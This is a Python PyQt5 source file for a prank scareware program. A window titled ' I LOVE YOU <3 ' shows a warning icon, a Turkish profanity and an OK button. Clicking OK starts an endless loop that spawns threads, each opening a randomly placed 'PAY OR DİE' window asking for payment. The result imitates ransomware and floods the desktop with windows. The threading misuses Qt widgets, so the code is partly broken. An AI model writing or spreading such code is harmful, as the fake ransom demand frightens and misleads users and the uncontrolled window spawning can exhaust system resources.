######################### QT LIB #########################
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
import random
import time
import threading

class Ui_ihackyou5( QtWidgets.QMainWindow ):
    def __init__(self): #*****
        super().__init__() #*****

        self.setupUi() #*****  


    def kapat(self):
        self.close()


    def fast(self):
        a = random.randint(1, 1000)
        b = random.randint(1, 1000)
        self.pencere = QtWidgets.QWidget()
        self.pencere.setWindowTitle("PAY OR DİE")
        self.pencere.setGeometry(a, b,500,500)
        self.pencere.resize(360, 360)
        self.pencere.setMinimumSize(QtCore.QSize(360, 360))
        self.pencere.setMaximumSize(QtCore.QSize(360, 360))

        self.baslik = QtWidgets.QLabel(self.pencere)
        self.baslik.setText("ÖDEME YAP KAPATİM ?")
        self.baslik.setGeometry(QtCore.QRect(30, 60, 291, 81))
        self.baslik.setObjectName("baslik")
        self.baslik.setFont(QFont('Arial', 10))

        self.pencere.show()
        time.sleep(10)

        
    def Looop(self):
        while True:
            t1 = threading.Thread(target=self.fast)
            t1.start()           


    def setupUi(self):
        self.setObjectName("ihackyou")
        self.resize(227, 195)
        self.setWindowTitle(" I LOVE YOU <3 ")
        self.centralwidget = QtWidgets.QWidget()
        self.centralwidget.setObjectName("centralwidget")
        self.text1 = QtWidgets.QLabel(self.centralwidget)
        self.text1.setGeometry(QtCore.QRect(100, 40, 91, 61))
        font = QtGui.QFont()
        font.setPointSize(10)
        font.setBold(True)
        font.setWeight(75)
        self.text1.setFont(font)
        self.text1.setMouseTracking(False)
        self.text1.setObjectName("text1")
        self.backgr = QtWidgets.QLabel(self.centralwidget)
        self.backgr.setGeometry(QtCore.QRect(-4, 140, 361, 71))
        self.backgr.setStyleSheet("background-color:rgb(216, 216, 216)")
        self.backgr.setText("")
        self.backgr.setObjectName("backgr")
        self.evet = QtWidgets.QPushButton(self.centralwidget)
        self.evet.setGeometry(QtCore.QRect(90, 150, 101, 31))
        self.evet.setStyleSheet("border: 1px solid #3A3939;")
        self.evet.setObjectName("evet")
        self.warningicon = QtWidgets.QLabel(self.centralwidget)
        self.warningicon.setGeometry(QtCore.QRect(20, 40, 61, 61))
        self.warningicon.setText("")
        self.warningicon.setPixmap(QtGui.QPixmap("./image/war.png"))
        self.warningicon.setScaledContents(True)
        self.warningicon.setObjectName("warningicon")
        self.setCentralWidget(self.centralwidget)


        self.evet.clicked.connect(self.Looop)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.text1.setText(_translate("ihackyou", "amına koyim"))
        self.evet.setText(_translate("ihackyou", "Tamam"))
